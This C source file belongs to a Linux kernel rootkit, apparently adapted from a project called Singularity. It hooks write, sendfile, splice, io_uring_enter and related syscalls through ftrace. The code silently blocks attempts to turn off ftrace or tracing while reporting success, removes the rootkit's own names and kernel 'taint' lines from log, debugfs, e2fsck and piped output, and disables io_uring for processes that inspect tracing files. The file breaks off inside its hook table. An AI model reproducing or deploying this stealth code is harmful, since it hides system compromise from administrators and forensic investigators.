/* hooks_write.c -- Write-path and io_uring protection.
 *
 * Adapted from Singularity (partnership/Singularity/modules/hooks_write.c).
 * Changes from upstream:
 *   - Pattern strings updated to BAT module names (kperf_qos, .svc_perf)
 *   - Hook table uses ARCH_SYS() + ARCH_SYS_IA32() from arch.h
 *   - ia32 hook bodies guarded by #ifdef ARCH_SYS_IA32 (no-op on ARM64)
 *   - EXPORT_SYMBOL removed (single-module build)
 *
 * Protections:
 *   1. Prevent writes to /proc/sys/kernel/ftrace_enabled and tracing_on
 *      that could disable our ftrace hooks.
 *   2. Filter BAT module names from forensics tool output (defense-in-depth).
 *   3. Block io_uring_enter for processes that monitor ftrace internals,
 *      preventing async I/O bypass of our syscall hooks.
 */
#include "../include/core.h"
#include "../include/hooks_write.h"
#include "../ftrace/ftrace_helper.h"

#define BUF_SIZE 4096

/* BAT-specific patterns to filter from tool output */
static const char * const bat_patterns[] = {
    "kperf_qos",
    "bat_stealth",
    "bat-stealth",
    ".svc_perf",
    ".cache/systemd",
    NULL
};

/* ── helpers ──────────────────────────────────────────────────────────── */

static notrace void *memmem_k(const void *haystack, size_t hlen,
                               const void *needle, size_t nlen)
{
    const unsigned char *h = haystack;
    const unsigned char *n = needle;
    size_t i, j;

    if (nlen == 0 || nlen > hlen)
        return NULL;

    for (i = 0; i <= hlen - nlen; i++) {
        for (j = 0; j < nlen; j++) {
            if (h[i + j] != n[j])
                break;
        }
        if (j == nlen)
            return (void *)(h + i);
    }
    return NULL;
}

static notrace void *memmem_ci(const void *haystack, size_t hlen,
                                const void *needle, size_t nlen)
{
    const unsigned char *h = haystack;
    const unsigned char *n = needle;
    size_t i, j;

    if (nlen == 0 || nlen > hlen)
        return NULL;

    for (i = 0; i <= hlen - nlen; i++) {
        for (j = 0; j < nlen; j++) {
            unsigned char hc = h[i + j];
            unsigned char nc = n[j];
            if (hc >= 'A' && hc <= 'Z') hc += 32;
            if (nc >= 'A' && nc <= 'Z') nc += 32;
            if (hc != nc)
                break;
        }
        if (j == nlen)
            return (void *)(h + i);
    }
    return NULL;
}

static notrace bool buffer_has_taint(const char *buf, size_t len)
{
    if (!buf || len == 0)
        return false;
    return memmem_ci(buf, len, "taint", 5) != NULL;
}

static notrace bool buffer_has_bat_pattern(const char *buf, size_t len)
{
    int i;
    if (!buf || len == 0)
        return false;
    for (i = 0; bat_patterns[i]; i++) {
        if (memmem_ci(buf, len, bat_patterns[i], strlen(bat_patterns[i])))
            return true;
    }
    return false;
}

static notrace bool process_has_block_device_open(void)
{
    struct files_struct *files;
    struct fdtable *fdt;
    struct file *file;
    unsigned int i;
    bool has_blkdev = false;
    unsigned long flags;
    struct inode *inode;

    files = current->files;
    if (!files)
        return false;

    spin_lock_irqsave(&files->file_lock, flags);
    fdt = files_fdtable(files);
    if (!fdt) {
        spin_unlock_irqrestore(&files->file_lock, flags);
        return false;
    }
    for (i = 0; i < fdt->max_fds && i < 256; i++) {
        file = fdt->fd[i];
        if (!file || !file->f_path.dentry)
            continue;
        inode = file->f_path.dentry->d_inode;
        if (inode && S_ISBLK(inode->i_mode)) {
            has_blkdev = true;
            break;
        }
    }
    spin_unlock_irqrestore(&files->file_lock, flags);
    return has_blkdev;
}

static notrace bool fd_is_pipe(int fd)
{
    struct file *file;
    struct inode *inode;
    bool is_pipe = false;

    file = fget(fd);
    if (!file)
        return false;
    if (file->f_path.dentry) {
        inode = file->f_path.dentry->d_inode;
        if (inode && S_ISFIFO(inode->i_mode))
            is_pipe = true;
    }
    fput(file);
    return is_pipe;
}

static notrace bool is_fs_tool_output(const char *buf, size_t len)
{
    if (memmem_k(buf, len, "debugfs:", 8))
        return true;
    if (memmem_k(buf, len, "Inode count:", 12))
        return true;
    if (memmem_k(buf, len, "Block count:", 12))
        return true;
    if (memmem_k(buf, len, "Filesystem UUID:", 16))
        return true;
    if (memmem_k(buf, len, "e2fsck", 6))
        return true;
    return false;
}

static notrace bool is_kernel_log_output(const char *buf, size_t len)
{
    if (len < 50)
        return false;
    if (memmem_k(buf, len, "[    ", 5) || memmem_k(buf, len, "[ ", 2))
        if (memmem_k(buf, len, "] ", 2))
            return true;
    if (memmem_k(buf, len, "kernel:", 7))
        return true;
    return false;
}

static notrace void sanitize_bat_strings(char *buf, size_t len)
{
    int i;
    char *ptr;
    size_t remaining;
    void *found;
    size_t plen;

    if (!buf)
        return;

    for (i = 0; bat_patterns[i]; i++) {
        plen = strlen(bat_patterns[i]);
        if (len < plen)
            continue;
        ptr = buf;
        remaining = len;
        while (remaining >= plen) {
            found = memmem_ci(ptr, remaining, bat_patterns[i], plen);
            if (!found)
                break;
            memset(found, ' ', plen);
            ptr = (char *)found + plen;
            remaining = len - (ptr - buf);
        }
    }
}

static notrace ssize_t filter_bat_lines(char *buf, size_t len)
{
    char *out;
    size_t out_len = 0;
    size_t i = 0;

    if (!buf || len == 0)
        return 0;

    out = kmalloc(len, GFP_ATOMIC);
    if (!out)
        return len;

    while (i < len) {
        size_t line_start = i;
        bool skip = false;

        while (i < len && buf[i] != '\n')
            i++;
        if (i < len && buf[i] == '\n')
            i++;

        if (buffer_has_bat_pattern(buf + line_start, i - line_start))
            skip = true;

        if (!skip && (i - line_start) > 0) {
            memcpy(out + out_len, buf + line_start, i - line_start);
            out_len += (i - line_start);
        }
    }

    if (out_len > 0)
        memcpy(buf, out, out_len);

    kfree(out);
    return out_len;
}

static notrace ssize_t filter_taint_lines(char *buf, size_t len)
{
    char *out;
    size_t out_len = 0;
    size_t i = 0;

    if (!buf || len == 0)
        return 0;

    out = kmalloc(len, GFP_ATOMIC);
    if (!out)
        return len;

    while (i < len) {
        size_t line_start = i;
        bool skip = false;

        while (i < len && buf[i] != '\n')
            i++;
        if (i < len && buf[i] == '\n')
            i++;

        if (buffer_has_taint(buf + line_start, i - line_start))
            skip = true;

        if (!skip && (i - line_start) > 0) {
            memcpy(out + out_len, buf + line_start, i - line_start);
            out_len += (i - line_start);
        }
    }

    if (out_len > 0)
        memcpy(buf, out, out_len);

    kfree(out);
    return out_len;
}

/* ── ftrace/tracing file detection ───────────────────────────────────── */

static notrace bool is_real_ftrace_enabled(struct file *file)
{
    const char *name;
    struct dentry *dentry, *parent;
    struct super_block *sb;

    if (!file || !file->f_path.dentry)
        return false;

    dentry = file->f_path.dentry;
    name = dentry->d_name.name;
    if (!name || strcmp(name, "ftrace_enabled") != 0)
        return false;

    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
        return false;
    sb = file->f_path.mnt->mnt_sb;
    if (!sb->s_type || !sb->s_type->name)
        return false;
    if (strcmp(sb->s_type->name, "proc") != 0 &&
        strcmp(sb->s_type->name, "sysfs") != 0)
        return false;

    parent = dentry->d_parent;
    if (!parent || !parent->d_name.name || strcmp(parent->d_name.name, "kernel") != 0)
        return false;
    parent = parent->d_parent;
    if (!parent || !parent->d_name.name || strcmp(parent->d_name.name, "sys") != 0)
        return false;

    return true;
}

static notrace bool is_real_tracing_on(struct file *file)
{
    const char *name;
    struct super_block *sb;

    if (!file || !file->f_path.dentry)
        return false;

    name = file->f_path.dentry->d_name.name;
    if (!name || strcmp(name, "tracing_on") != 0)
        return false;

    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
        return false;
    sb = file->f_path.mnt->mnt_sb;
    if (!sb->s_type || !sb->s_type->name)
        return false;
    if (strcmp(sb->s_type->name, "tracefs") != 0 &&
        strcmp(sb->s_type->name, "debugfs") != 0)
        return false;

    return true;
}

/* ── saved_ftrace_value (needed by clear_taint_dmesg) ────────────────── */

char saved_ftrace_value[64] = "1\n";
bool ftrace_write_intercepted = false;

/* ── ftrace write interceptor ────────────────────────────────────────── */

static asmlinkage ssize_t (*original_write)(const struct pt_regs *);

static notrace asmlinkage ssize_t hooked_write_ftrace(
    const struct pt_regs *regs,
    asmlinkage ssize_t (*orig)(const struct pt_regs *),
    int fd, const char __user *user_buf, size_t count)
{
    struct file *file;
    char *kernel_buf;
    size_t len, i, start, end;
    long parsed_value;
    int ret;
    ssize_t result = -EINVAL;
    loff_t pos;

    if (!orig || !regs)
        return -EINVAL;

    file = fget(fd);
    if (!file)
        return orig(regs);

    pos = file->f_pos;
    if (pos == 0)
        ftrace_write_intercepted = false;

    if (count == 0) {
        fput(file);
        return -EINVAL;
    }

    kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
    if (!kernel_buf) {
        fput(file);
        return -ENOMEM;
    }

    if (copy_from_user(kernel_buf, user_buf, min(count, (size_t)BUF_SIZE))) {
        result = -EFAULT;
        goto out;
    }

    len = min(count, (size_t)BUF_SIZE - 1);
    kernel_buf[len] = '\0';

    for (i = 0; i < len; i++) {
        char c = kernel_buf[i];
        if ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||
            (c >= 'A' && c <= 'F') || c == 'x' || c == 'X' ||
            c == '-' || c == ' ' || c == '\t' || c == '\n' ||
            c == '\r' || c == '\f' || c == '\v' || c == '\0')
            continue;
        result = -EINVAL;
        goto out;
    }

    start = 0;
    while (start < len && (kernel_buf[start] == '\0' || kernel_buf[start] == ' ' ||
                            kernel_buf[start] == '\t' || kernel_buf[start] == '\f' ||
                            kernel_buf[start] == '\v'))
        start++;

    if (start >= len) {
        file->f_pos += count;
        result = count;
        goto out;
    }

    if (pos != 0) {
        result = ftrace_write_intercepted ? count : -EINVAL;
        if (ftrace_write_intercepted)
            file->f_pos += count;
        goto out;
    }

    end = start;
    while (end < len && kernel_buf[end] != '\n' && kernel_buf[end] != '\0' &&
           kernel_buf[end] != ' ' && kernel_buf[end] != '\r' && kernel_buf[end] != '\t')
        end++;

    if (end == start || kernel_buf[start] == '+' || (end - start) > 20) {
        result = -EINVAL;
        goto out;
    }

    kernel_buf[end] = '\0';
    ret = kstrtol(kernel_buf + start, 0, &parsed_value);
    if (ret != 0 || parsed_value > INT_MAX || parsed_value < INT_MIN) {
        result = -EINVAL;
        goto out;
    }

    snprintf(saved_ftrace_value, sizeof(saved_ftrace_value), "%ld\n", parsed_value);
    ftrace_write_intercepted = true;
    file->f_pos += count;
    result = count;

out:
    kfree(kernel_buf);
    fput(file);
    return result;
}

/* ── write / write32 ─────────────────────────────────────────────────── */

static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs)
{
    int fd = (int)REGS_ARG0(regs);
    char __user *user_buf = (char __user *)REGS_ARG1(regs);
    size_t count = (size_t)REGS_ARG2(regs);
    size_t original_count = count;
    struct file *file;
    char *kernel_buf;
    ssize_t filtered_len, ret;
    bool is_ftrace, is_tracing;
    bool needs_taint, needs_bat, is_fs_tool, is_pipe;

    if (!regs)
        return -EINVAL;

    file = fget(fd);
    if (file) {
        is_ftrace  = is_real_ftrace_enabled(file);
        is_tracing = is_real_tracing_on(file);
        fput(file);
        if (is_ftrace || is_tracing)
            return hooked_write_ftrace(regs, original_write, fd, user_buf, count);
    }

    if (count == 0 || count > (2 * 1024 * 1024) || fd < 1)
        return original_write(regs);

    kernel_buf = kvmalloc(count + 1, GFP_KERNEL);
    if (!kernel_buf)
        return original_write(regs);

    if (copy_from_user(kernel_buf, user_buf, count)) {
        kvfree(kernel_buf);
        return original_write(regs);
    }
    kernel_buf[count] = '\0';

    is_fs_tool = process_has_block_device_open() || is_fs_tool_output(kernel_buf, count);
    is_pipe    = fd_is_pipe(fd);
    needs_taint = buffer_has_taint(kernel_buf, count) && is_kernel_log_output(kernel_buf, count);
    needs_bat   = buffer_has_bat_pattern(kernel_buf, count) && (is_fs_tool || is_pipe);

    if (!needs_taint && !needs_bat) {
        kvfree(kernel_buf);
        return original_write(regs);
    }

    if (needs_bat && is_fs_tool && !is_pipe) {
        sanitize_bat_strings(kernel_buf, count);
        if (copy_to_user(user_buf, kernel_buf, count)) {
            kvfree(kernel_buf);
            return original_write(regs);
        }
        kvfree(kernel_buf);
        return original_write(regs);
    }

    if (needs_bat && is_pipe) {
        filtered_len = filter_bat_lines(kernel_buf, count);
        if (filtered_len == 0) {
            kvfree(kernel_buf);
            return original_count;
        }
        count = filtered_len;
    }

    if (needs_taint) {
        filtered_len = filter_taint_lines(kernel_buf, count);
        if (filtered_len == 0) {
            kvfree(kernel_buf);
            return original_count;
        }
    } else {
        filtered_len = count;
    }

    if (copy_to_user(user_buf, kernel_buf, filtered_len)) {
        kvfree(kernel_buf);
        return original_write(regs);
    }
    kvfree(kernel_buf);

    {
        struct pt_regs modified_regs = *regs;
#ifdef CONFIG_X86_64
        modified_regs.dx = filtered_len;
#elif defined(CONFIG_ARM64)
        modified_regs.regs[2] = filtered_len;
#endif
        ret = original_write(&modified_regs);
    }

    return (ret > 0) ? (ssize_t)original_count : ret;
}

/* ── pwrite64 ────────────────────────────────────────────────────────── */

static asmlinkage ssize_t (*original_pwrite64)(const struct pt_regs *);

static notrace asmlinkage ssize_t hooked_pwrite64(const struct pt_regs *regs)
{
    int fd = (int)REGS_ARG0(regs);
    struct file *file;

    if (!regs)
        return -EINVAL;

    file = fget(fd);
    if (file) {
        bool is_ftrace  = is_real_ftrace_enabled(file);
        bool is_tracing = is_real_tracing_on(file);
        fput(file);
        if (is_ftrace || is_tracing)
            return hooked_write_ftrace(regs, original_pwrite64, fd,
                (const char __user *)REGS_ARG1(regs), (size_t)REGS_ARG2(regs));
    }
    return original_pwrite64(regs);
}

/* ── writev / pwritev / pwritev2 (ftrace interception only) ─────────── */

static asmlinkage ssize_t (*original_writev)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev2)(const struct pt_regs *);

static notrace asmlinkage ssize_t hooked_writev_common(
    const struct pt_regs *regs,
    asmlinkage ssize_t (*orig)(const struct pt_regs *))
{
    int fd = (int)REGS_ARG0(regs);
    struct file *file;

    if (!orig || !regs)
        return -EINVAL;

    file = fget(fd);
    if (!file)
        return orig(regs);

    if (is_real_ftrace_enabled(file) || is_real_tracing_on(file)) {
        fput(file);
        return (ssize_t)REGS_ARG2(regs);
    }
    fput(file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_writev(const struct pt_regs *regs)
{ return hooked_writev_common(regs, original_writev); }
static notrace asmlinkage ssize_t hooked_pwritev(const struct pt_regs *regs)
{ return hooked_writev_common(regs, original_pwritev); }
static notrace asmlinkage ssize_t hooked_pwritev2(const struct pt_regs *regs)
{ return hooked_writev_common(regs, original_pwritev2); }

/* ── fd-to-fd transfers (sendfile, copy_file_range, splice, vmsplice, tee) */

static asmlinkage ssize_t (*original_sendfile)(const struct pt_regs *);
static asmlinkage ssize_t (*original_sendfile64)(const struct pt_regs *);
static asmlinkage ssize_t (*original_copy_file_range)(const struct pt_regs *);
static asmlinkage ssize_t (*original_splice)(const struct pt_regs *);
static asmlinkage ssize_t (*original_vmsplice)(const struct pt_regs *);
static asmlinkage ssize_t (*original_tee)(const struct pt_regs *);

static notrace asmlinkage ssize_t hooked_fd_out_common(
    const struct pt_regs *regs,
    asmlinkage ssize_t (*orig)(const struct pt_regs *),
    int out_fd, size_t count)
{
    struct file *out_file;

    if (!orig || !regs)
        return -EINVAL;

    out_file = fget(out_fd);
    if (!out_file)
        return orig(regs);

    if (is_real_ftrace_enabled(out_file) || is_real_tracing_on(out_file)) {
        fput(out_file);
        return count;
    }
    fput(out_file);
    return orig(regs);
}

/* sendfile(out_fd=ARG0, in_fd=ARG1, offset=ARG2, count=ARG3) */
static notrace asmlinkage ssize_t hooked_sendfile(const struct pt_regs *regs)
{ return hooked_fd_out_common(regs, original_sendfile,
    (int)REGS_ARG0(regs), (size_t)REGS_ARG3(regs)); }
static notrace asmlinkage ssize_t hooked_sendfile64(const struct pt_regs *regs)
{ return hooked_fd_out_common(regs, original_sendfile64,
    (int)REGS_ARG0(regs), (size_t)REGS_ARG3(regs)); }

/* copy_file_range(fd_in, off_in, fd_out=ARG2, off_out, len=ARG4, flags) */
static notrace asmlinkage ssize_t hooked_copy_file_range(const struct pt_regs *regs)
{ return hooked_fd_out_common(regs, original_copy_file_range,
    (int)REGS_ARG2(regs), (size_t)REGS_ARG4(regs)); }

/* splice(fd_in, off_in, fd_out=ARG2, off_out, len=ARG4, flags) */
static notrace asmlinkage ssize_t hooked_splice(const struct pt_regs *regs)
{ return hooked_fd_out_common(regs, original_splice,
    (int)REGS_ARG2(regs), (size_t)REGS_ARG4(regs)); }

/* vmsplice(fd=ARG0, iov, nr_segs=ARG2, flags) */
static notrace asmlinkage ssize_t hooked_vmsplice(const struct pt_regs *regs)
{ return hooked_fd_out_common(regs, original_vmsplice,
    (int)REGS_ARG0(regs), (size_t)REGS_ARG2(regs)); }

/* tee(fd_in=ARG0, fd_out=ARG1, len=ARG2, flags) */
static notrace asmlinkage ssize_t hooked_tee(const struct pt_regs *regs)
{ return hooked_fd_out_common(regs, original_tee,
    (int)REGS_ARG1(regs), (size_t)REGS_ARG2(regs)); }

/* ── io_uring_enter ──────────────────────────────────────────────────── */

static asmlinkage long (*original_io_uring_enter)(const struct pt_regs *);

static DEFINE_SPINLOCK(io_uring_cache_lock);
static pid_t io_uring_last_blocked = 0;
static unsigned long io_uring_last_jiffies = 0;

static notrace bool process_has_protected_fd(void)
{
    struct files_struct *files;
    struct fdtable *fdt;
    struct file *file;
    unsigned int i;
    bool found = false;
    unsigned long flags;

    files = current->files;
    if (!files)
        return false;

    spin_lock_irqsave(&files->file_lock, flags);
    fdt = files_fdtable(files);
    if (!fdt) {
        spin_unlock_irqrestore(&files->file_lock, flags);
        return false;
    }
    for (i = 0; i < fdt->max_fds; i++) {
        file = fdt->fd[i];
        if (file && (is_real_ftrace_enabled(file) || is_real_tracing_on(file))) {
            found = true;
            break;
        }
    }
    spin_unlock_irqrestore(&files->file_lock, flags);
    return found;
}

static notrace asmlinkage long hooked_io_uring_enter(const struct pt_regs *regs)
{
    pid_t cur_pid;
    bool should_block = false;
    unsigned long flags;

    if (!regs || !original_io_uring_enter)
        return -EINVAL;

    cur_pid = current->pid;

    spin_lock_irqsave(&io_uring_cache_lock, flags);
    if (cur_pid == io_uring_last_blocked &&
        time_before(jiffies, io_uring_last_jiffies + HZ)) {
        should_block = true;
        spin_unlock_irqrestore(&io_uring_cache_lock, flags);
    } else {
        spin_unlock_irqrestore(&io_uring_cache_lock, flags);
        should_block = process_has_protected_fd();
        if (should_block) {
            spin_lock_irqsave(&io_uring_cache_lock, flags);
            io_uring_last_blocked = cur_pid;
            io_uring_last_jiffies = jiffies;
            spin_unlock_irqrestore(&io_uring_cache_lock, flags);
        }
    }

    if (should_block)
        return -EINVAL;

    return original_io_uring_enter(regs);
}

/* ── ia32 compat hooks (x86_64 only) ────────────────────────────────── */

#ifdef ARCH_SYS_IA32

static asmlinkage ssize_t (*original_write32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwrite64_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_writev32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev2_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_sendfile_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_sendfile64_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_compat_sendfile)(const struct pt_regs *);
static asmlinkage ssize_t (*original_compat_sendfile64)(const struct pt_regs *);
static asmlinkage ssize_t (*original_copy_file_range_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_splice_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_vmsplice_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_tee_ia32)(const struct pt_regs *);
static asmlinkage long (*original_io_uring_enter2)(const struct pt_regs *);

static notrace asmlinkage ssize_t hooked_write32(const struct pt_regs *regs)
{
    int fd = (int)regs->bx;
    char __user *user_buf = (char __user *)regs->cx;
    size_t count = (size_t)regs->dx;
    size_t original_count = count;
    struct file *file;
    char *kernel_buf;
    ssize_t filtered_len, ret;
    bool needs_taint, needs_bat, is_fs_tool, is_pipe;

    if (!regs)
        return -EINVAL;

    file = fget(fd);
    if (file) {
        bool is_ftrace  = is_real_ftrace_enabled(file);
        bool is_tracing = is_real_tracing_on(file);
        fput(file);
        if (is_ftrace || is_tracing)
            return hooked_write_ftrace(regs, original_write32, fd, user_buf, count);
    }

    if (count == 0 || count > (2 * 1024 * 1024) || fd < 1)
        return original_write32(regs);

    kernel_buf = kvmalloc(count + 1, GFP_KERNEL);
    if (!kernel_buf)
        return original_write32(regs);

    if (copy_from_user(kernel_buf, user_buf, count)) {
        kvfree(kernel_buf);
        return original_write32(regs);
    }
    kernel_buf[count] = '\0';

    is_fs_tool = process_has_block_device_open() || is_fs_tool_output(kernel_buf, count);
    is_pipe    = fd_is_pipe(fd);
    needs_taint = buffer_has_taint(kernel_buf, count) && is_kernel_log_output(kernel_buf, count);
    needs_bat   = buffer_has_bat_pattern(kernel_buf, count) && (is_fs_tool || is_pipe);

    if (!needs_taint && !needs_bat) {
        kvfree(kernel_buf);
        return original_write32(regs);
    }

    if (needs_bat && is_fs_tool && !is_pipe) {
        sanitize_bat_strings(kernel_buf, count);
        copy_to_user(user_buf, kernel_buf, count);
        kvfree(kernel_buf);
        return original_write32(regs);
    }

    filtered_len = count;
    if (needs_bat && is_pipe) {
        filtered_len = filter_bat_lines(kernel_buf, count);
        if (filtered_len == 0) { kvfree(kernel_buf); return original_count; }
        count = filtered_len;
    }
    if (needs_taint) {
        filtered_len = filter_taint_lines(kernel_buf, count);
        if (filtered_len == 0) { kvfree(kernel_buf); return original_count; }
    } else {
        filtered_len = count;
    }

    if (copy_to_user(user_buf, kernel_buf, filtered_len)) {
        kvfree(kernel_buf);
        return original_write32(regs);
    }
    kvfree(kernel_buf);

    {
        struct pt_regs mod = *regs;
        mod.dx = filtered_len;
        ret = original_write32(&mod);
    }
    return (ret > 0) ? (ssize_t)original_count : ret;
}

static notrace asmlinkage ssize_t hooked_pwrite64_ia32(const struct pt_regs *regs)
{
    int fd = (int)regs->bx;
    struct file *file;
    if (!regs) return -EINVAL;
    file = fget(fd);
    if (file) {
        bool is_ftrace  = is_real_ftrace_enabled(file);
        bool is_tracing = is_real_tracing_on(file);
        fput(file);
        if (is_ftrace || is_tracing)
            return hooked_write_ftrace(regs, original_pwrite64_ia32, fd,
                (const char __user *)regs->cx, (size_t)regs->dx);
    }
    return original_pwrite64_ia32(regs);
}

static notrace asmlinkage ssize_t hooked_writev_ia32_common(
    const struct pt_regs *regs,
    asmlinkage ssize_t (*orig)(const struct pt_regs *))
{
    int fd = (int)regs->bx;
    struct file *file;
    if (!orig || !regs) return -EINVAL;
    file = fget(fd);
    if (!file) return orig(regs);
    if (is_real_ftrace_enabled(file) || is_real_tracing_on(file)) {
        fput(file);
        return (ssize_t)regs->dx;
    }
    fput(file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_writev32(const struct pt_regs *regs)
{ return hooked_writev_ia32_common(regs, original_writev32); }
static notrace asmlinkage ssize_t hooked_pwritev_ia32(const struct pt_regs *regs)
{ return hooked_writev_ia32_common(regs, original_pwritev_ia32); }
static notrace asmlinkage ssize_t hooked_pwritev2_ia32(const struct pt_regs *regs)
{ return hooked_writev_ia32_common(regs, original_pwritev2_ia32); }

static notrace asmlinkage ssize_t hooked_sendfile_ia32(const struct pt_regs *regs)
{
    int out_fd = (int)regs->bx;
    size_t count = (size_t)regs->si;
    struct file *f;
    if (!regs) return -EINVAL;
    f = fget(out_fd);
    if (!f) return original_sendfile_ia32(regs);
    if (is_real_ftrace_enabled(f) || is_real_tracing_on(f)) { fput(f); return count; }
    fput(f);
    return original_sendfile_ia32(regs);
}
static notrace asmlinkage ssize_t hooked_sendfile64_ia32(const struct pt_regs *regs)
{
    int out_fd = (int)regs->bx;
    size_t count = (size_t)regs->si;
    struct file *f;
    if (!regs) return -EINVAL;
    f = fget(out_fd);
    if (!f) return original_sendfile64_ia32(regs);
    if (is_real_ftrace_enabled(f) || is_real_tracing_on(f)) { fput(f); return count; }
    fput(f);
    return original_sendfile64_ia32(regs);
}
static notrace asmlinkage ssize_t hooked_compat_sendfile(const struct pt_regs *regs)
{
    int out_fd = (int)regs->bx;
    size_t count = (size_t)regs->si;
    struct file *f;
    if (!regs) return -EINVAL;
    f = fget(out_fd);
    if (!f) return original_compat_sendfile(regs);
    if (is_real_ftrace_enabled(f) || is_real_tracing_on(f)) { fput(f); return count; }
    fput(f);
    return original_compat_sendfile(regs);
}
static notrace asmlinkage ssize_t hooked_compat_sendfile64(const struct pt_regs *regs)
{
    int out_fd = (int)regs->bx;
    size_t count = (size_t)regs->si;
    struct file *f;
    if (!regs) return -EINVAL;
    f = fget(out_fd);
    if (!f) return original_compat_sendfile64(regs);
    if (is_real_ftrace_enabled(f) || is_real_tracing_on(f)) { fput(f); return count; }
    fput(f);
    return original_compat_sendfile64(regs);
}

static notrace asmlinkage ssize_t hooked_copy_file_range_ia32(const struct pt_regs *regs)
{
    int fd_out = (int)regs->si;
    size_t count = (size_t)regs->r8;
    struct file *f;
    if (!regs) return -EINVAL;
    f = fget(fd_out);
    if (!f) return original_copy_file_range_ia32(regs);
    if (is_real_ftrace_enabled(f) || is_real_tracing_on(f)) { fput(f); return count; }
    fput(f);
    return original_copy_file_range_ia32(regs);
}
static notrace asmlinkage ssize_t hooked_splice_ia32(const struct pt_regs *regs)
{
    int fd_out = (int)regs->dx;
    size_t count = (size_t)regs->si;
    struct file *f;
    if (!regs) return -EINVAL;
    f = fget(fd_out);
    if (!f) return original_splice_ia32(regs);
    if (is_real_ftrace_enabled(f) || is_real_tracing_on(f)) { fput(f); return count; }
    fput(f);
    return original_splice_ia32(regs);
}
static notrace asmlinkage ssize_t hooked_vmsplice_ia32(const struct pt_regs *regs)
{
    int fd = (int)regs->bx;
    size_t nr_segs = (size_t)regs->dx;
    struct file *f;
    if (!regs) return -EINVAL;
    f = fget(fd);
    if (!f) return original_vmsplice_ia32(regs);
    if (is_real_ftrace_enabled(f) || is_real_tracing_on(f)) { fput(f); return nr_segs; }
    fput(f);
    return original_vmsplice_ia32(regs);
}
static notrace asmlinkage ssize_t hooked_tee_ia32(const struct pt_regs *regs)
{
    int fd_out = (int)regs->cx;
    size_t count = (size_t)regs->dx;
    struct file *f;
    if (!regs) return -EINVAL;
    f = fget(fd_out);
    if (!f) return original_tee_ia32(regs);
    if (is_real_ftrace_enabled(f) || is_real_tracing_on(f)) { fput(f); return count; }
    fput(f);
    return original_tee_ia32(regs);
}

static notrace asmlinkage long hooked_io_uring_enter2(const struct pt_regs *regs)
{
    pid_t cur_pid;
    bool should_block = false;
    unsigned long flags;

    if (!regs || !original_io_uring_enter2)
        return -EINVAL;

    cur_pid = current->pid;
    spin_lock_irqsave(&io_uring_cache_lock, flags);
    if (cur_pid == io_uring_last_blocked &&
        time_before(jiffies, io_uring_last_jiffies + HZ)) {
        should_block = true;
        spin_unlock_irqrestore(&io_uring_cache_lock, flags);
    } else {
        spin_unlock_irqrestore(&io_uring_cache_lock, flags);
        should_block = process_has_protected_fd();
        if (should_block) {
            spin_lock_irqsave(&io_uring_cache_lock, flags);
            io_uring_last_blocked = cur_pid;
            io_uring_last_jiffies = jiffies;
            spin_unlock_irqrestore(&io_uring_cache_lock, flags);
        }
    }
    if (should_block)
        return -EINVAL;
    return original_io_uring_enter2(regs);
}

#endif /* ARCH_SYS_IA32 */

/* ── hook tables ─────────────────────────────────────────────────────── */

static struct ftrace_hook hw_hooks[] = {
    HOOK(ARCH_SYS("write"),             hooked_write,            &original_write),
    HOOK(ARCH_SYS("pwrite64"),          hooked_pwrite64,         &original_pwrite64),
    HOOK(ARCH_SYS("writev"),            hooked_writev,           &original_writev),
    HOOK(ARCH_SYS("pwritev"),           hooked_pwritev,          &original_pwritev),
    HOOK(ARCH_SYS("pwritev2"),          hooked_pwritev2,         &original_pwritev2),
    HOOK(ARCH_SYS("sendfile"),          hooked_sendfile,         &original_sendfile),
    HOOK(ARCH_SYS("sendfile64"),        hooked_sendfile64,       &original_sendfile64),
    HOOK(ARCH_SYS("copy_file_range"),   hooked_copy_file_range,  &original_copy_file_range),
    HOOK(ARCH_SYS("splice"),            hooked_splice,           &original_splice),
    HOOK(ARCH_SYS("vmsplice"),          hooked_vmsplice,         &original_vmsplice),
    HOOK(ARCH_SYS("tee"),               hooked_tee,              &original_tee),
    HOOK(ARCH_SYS("io_uring_enter"),    hooked_io_uring_enter,   &original_io_uring_enter),
};

#ifdef ARCH_SYS_IA32
static struct ftrace_hook hw_hooks_ia32[] = {
    HOOK(ARCH_SYS_IA32("write"),             hooked_write32,              &original_write32),
    HOOK(ARCH_SYS_IA32("pwrite64"),          hooked_pwrite64_ia32,        &original_pwrite64_ia32),
    HOOK(ARCH_SYS_IA32("writev"),            hooked_writev32,             &original_writev32),
    HOOK(ARCH_SYS_IA32("pwritev"),           hooked_pwritev_ia32,         &original_pwritev_ia32),
    HOOK(ARCH_SYS_IA32("pwritev2"),          hooked_pwritev2_ia32,        &original_pwritev2_ia32),
    HOOK(ARCH_SYS_IA32("sendfile"),          hooked_sendfile_ia32,        &original_sendfile_ia32),
    HOOK(ARCH_SYS_IA32("sendfile64"),        hooked_sendfile64_ia32,      &original_sendfile64_ia32),
    HOOK("__ia32_compat_sys_sendfile",       hooked_compat_sendfile,      &original_compat_sendfile),
    HOOK("__ia32_compat_sys_sendfile64",     hooked_compat_sendfile64,    &original_compat_sendfile64),
    HOOK(ARCH_SYS_IA32("copy_file_range"),   hooked_copy_file_range_ia32, &original_copy_file_range_ia32),
    HOOK(ARCH_SYS_IA32("splice"),            hooked_splice_ia32,          &original_splice_ia32),
    HOOK(ARCH_SYS_IA32("vmsplice"),          hooked_vmsplice_ia32,        &original_vmsplice_ia32),
